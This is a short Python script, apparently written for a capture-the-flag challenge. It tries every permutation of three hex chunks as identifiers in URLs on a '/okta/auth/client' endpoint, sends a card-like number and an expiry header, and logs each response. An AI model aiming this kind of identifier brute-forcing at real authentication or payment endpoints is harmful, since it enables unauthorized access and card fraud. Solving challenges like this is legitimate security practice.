import itertools
import requests

# Input: 3 UUIDs + Credit Card Number + Expiration Date as custom header

# === USER CONFIGURATION ===
hex_chunks = [
    '7be54a88fa','d0f5af22fb','123' # Third value can be anything
]

log_file = "okta_results.txt"

# URL format
BASE_URL = "https://target-flask.chals.io/okta/auth/client/{}/cel?use={}&addr={}&pmt=375524824238842"

headers = {
    "X-active": "11/28"
}
# ==========================


def generate_uuid_triplets(chunks):
    """
    Generate all permutations of 3 unique chunks to form uuid1, uuid2, uuid3.
    """
    print("[*] Generating unique UUID sets (no chunk reuse)...")
    all_combos = list(itertools.permutations(chunks, 3))
    print(f"[+] Total valid UUID combinations: {len(all_combos)}\n")
    return all_combos

def test_urls(uuid_sets):
    print("[*] Starting URL tests...\n")
    with open(log_file, "w", encoding="utf-8") as f:
        for i, (uuid1, uuid2, uuid3) in enumerate(uuid_sets):
            url = BASE_URL.format(uuid1, uuid2, uuid3)
            print(f"[{i+1}] Testing: {url}")
            try:
                response = requests.get(url, headers=headers)
                print(f" → Status: {response.status_code}")
                if response.status_code == 200:
                    print(" → ✅ Success")
                f.write(f"URL: {url}\nStatus: {response.status_code}\nResponse: {response.text}\n\n")
            except requests.RequestException as e:
                print(f" → ❌ Error: {e}")
                f.write(f"URL: {url}\nError: {e}\n\n")
    print("\n[*] Finished testing.")

if __name__ == "__main__":
    print("=== UUID API Tester — All UUIDs from Hex Chunks ===\n")
    print(f"[*] Hex chunks ({len(hex_chunks)}): {hex_chunks}\n")

    if len(hex_chunks) < 3:
        print("[!] You need at least 3 hex chunks.")
    else:
        uuid_triplets = generate_uuid_triplets(hex_chunks)
        if uuid_triplets:
            test_urls(uuid_triplets)
        else:
            print("[!] No valid UUID triplets found.")
